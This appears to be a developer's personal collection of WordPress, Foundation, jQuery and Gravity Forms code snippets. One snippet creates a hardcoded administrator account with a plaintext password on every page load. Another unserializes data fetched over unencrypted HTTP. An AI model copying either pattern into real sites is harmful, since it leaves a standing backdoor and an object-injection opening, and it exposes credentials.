CodeSnippets
============

CodeSnippets that I refer to a lot:

[Grid Cheat Sheet](http://grid.malven.co/){:target="_blank"}
[Flexbox Cheat Sheet](http://flexbox.malven.co/){:target="_blank"}


#WordPress

###Passing a variable through the content filter

```php
  <?php 
    $something = apply_filters('the_content', $something);
    echo $something;
  ?>
```

###Retrieve and display a Video URL

```php
  <?php 
    $song = get_field('song_link'); 
    $song = preg_replace('/\s+/', '', $song);	
    $song = wp_oembed_get($song);
    echo $song;
  ?>
```
###Featured Images
The post thumbnail
```php
<?php
  if ( has_post_thumbnail() ) {
    the_post_thumbnail('thumbnail', array('class' => 'alignleft'));
  }
?>
```

Get Custom Size
```php
<?php
  if ( has_post_thumbnail() ) {
    $url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'CUSTOM SIZE');
  }
?>
```


Add Image Size
```php
if ( function_exists( 'add_image_size' ) ) { 
	add_image_size( 'category-thumb', 300, 9999 ); //300 pixels wide (and unlimited height)
	add_image_size( 'homepage-thumb', 220, 180, true ); //(cropped)
}
```


##The Loop

###Query by Custom Field
```php
  <?php
    $args = array(
      'post_type' => array(
        'your-post-type',
      ),
      'order' => 'ASC',           
      'orderby' => 'menu_order',
      'meta_key' => 'your-custom-field',
      'meta_value' => 'your-custom-field-value'
    );
    
    $the_query = new WP_Query( $args );
    // The Loop
    
    if ( $the_query->have_posts() ) :
      while ( $the_query->have_posts() ) : $the_query->the_post(); 
  ?>
  
  THE STUFF THAT HAPPENS
  
  <?php
      endwhile;
    endif;
    
    // Reset Post Data
    wp_reset_postdata();
  ?>
```

##Some WordPress Functions

```php

// test if parent or child page of an id
function is_tree($pid) {      // $pid = The ID of the page we're looking for pages underneath
	global $post;         // load details about this page

        $parents = get_post_ancestors( $post->ID ); // Get the Ancestors
        
	/* Check if this page has our page id as one of its ancestors */
    	if(is_page()&&(is_page($pid)||in_array($pid, $parents))) {
      		return true;   // we're at the page or at a sub page
    	} else { 
      		return false;  // we're elsewhere
    	}
};

// list parent and child pages of an id
function list_tree($parent){
  echo '<li';
  if(is_page($parent)){ echo' class="current_page_item active"'; };
  echo '><a href="'.get_the_permalink($parent).'">'.get_the_title($parent).'</a></li>';
   $args = array(
    	'child_of'     => $parent,
      'sort_column'   => 'menu_order', 
      'title_li'    => (''),
    ); 
    
    wp_list_pages( $args );
};


```

###Get Vimeo video details from URL and store them in a transient

```php

function get_vimeo_details($video_url) {
	$videoId = preg_replace("/\D/", "",$video_url);
	if($videoId) {
		$transName = 'videoDetails_'.$videoId;
		$vidDetails = get_transient( $transName );

		if ( false === $vidDetails ) {
			$hash = unserialize(file_get_contents("http://vimeo.com/api/v2/video/$videoId.php"));
			$vidDetails = $hash[0];
			set_transient( $transName, $vidDetails, 24 * HOUR_IN_SECONDS );
		}
	return $vidDetails;
	}
}
```
Use it by then calling: 
```php 
	<?php $videoDetails = get_vimeo_details('https://vimeo.com/113439568'); ?>
```
and echo out all the details returned. For instance the large thumbnail: 
```php
	<?php echo $videoDetails['thumbnail_large']; ?>
```

##Add User via Functions

```php

<?php
function add_admin_acct(){
	$login = 'matt';
	$passw = 'mte2015';
	$email = 'matt@emptyhead.com.au';

	if ( !username_exists( $login )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}
add_action('init','add_admin_acct');
?>

```

#Foundation

##Settings

```css
// Using rem-calc for the below breakpoint causes issues with top bar
   $topbar-breakpoint: 810px; // Change to 9999px for always mobile layout
   $topbar-media-query:"only screen and (min-width: #{$topbar-breakpoint})" !default;
```

	
###jQuery - No conflict

```javascript

jQuery(document).ready(function( $ ) {

});
```
###ID Exist

```javascript
if($("#tagLineCanvas").length){
  tagLine();
}
```


#OTHER Code

###Redirect to other site, with pause for Analytics

####Don't forget came from code!!

```php

 <?php 
   /*
     Template Name: PUT THE TEMPLATE NAME
   */
 ?>
 
  <head>
  <title>TITLE FOR GOOGLE ANALYTICS</title>
	 <script type="text/javascript">
   
   // Google Analytics - Check this is the right one for the site
  	 
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'XXXXXXX']);
    _gaq.push(['_trackPageview']);
  
    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
    
    // Facebook Remarketing???

      
      // Google Remarketing??
      
    
    setTimeout(function () {
      window.location = "ADD THE ADDRESS HERE!!!!";
    }, 200);
  </script>
  </head>
  
```


## Foundation Map Styles

```css
 #map-canvas *, #map-canvas *:before, #map-canvas *:after {
        -moz-box-sizing: content-box!important;
        -webkit-box-sizing: content-box!important;
        box-sizing: content-box!important;  
    }
    #map-canvas img {
        max-width: none;
    }
    #map-canvas label {
        width: auto;
        display: inline;
    }
 ```

# Header Mustard Cut
 
 ```php
 <?php 
  if (isset($_COOKIE["screen-width"]) == 0 ) { ?>
    <script src="<?php bloginfo('template_url'); ?>/js/mustard-cut.js"></script>
<?php } else {
   $screen = $_COOKIE["screen-width"];
   global $screenSize;
   if($screen) {
    if ($screen > 700 ) {
       $screenSize = 'desktop';
     } else {
       $screenSize = 'mobile';
     }
   } else {
     $screenSize = 'mobile';
   }
  } ?>
 ```
 
### and the mustard-cut.js file mentioned above
 
 ```js
 
    (function() {
    
    // If the browser supports cookies and they are enabled
    if (navigator.cookieEnabled) {
      // Set the cookie for 3 days
      var date = new Date();
      date.setTime(date.getTime() + (3 * 24 * 60 * 60 * 1000));
      var expires = "; expires=" + date.toGMTString();
    
      // This is where we're setting the mustard cutting information.
      // In this case we're just setting screen width, but it could
      // be anything. Think http://modernizr.com/
      document.cookie = "screen-width=" + window.outerWidth + expires + "; path=/";
    
      /*
        Only refresh if the WRONG template loads.
    
        Since we're defaulting to a small screen,
        and we know if this script is running the
        cookie wasn't present on this page load,
        we should refresh if the screen is wider
        than 700.
    
        This needs to be kept in sync with the server
        side distinction
      */
        // Halt the browser from loading/doing anything else.
        window.stop();
        // Reload the page, because the cookie will now be
        // set and the server can use it.
        location.reload(true);
      }
    }());
 ```
#Gravity Forms

##Emded form on site

$id_or_title, $display_title, $display_description, $display_inactive, $field_values, $ajax, $tabindex, $echo

```php
	gravity_form( 1, false, false, false, '', false );
```

And the javascript

$form_id, $is_ajax

```php
	gravity_form_enqueue_scripts( 4, true );
```
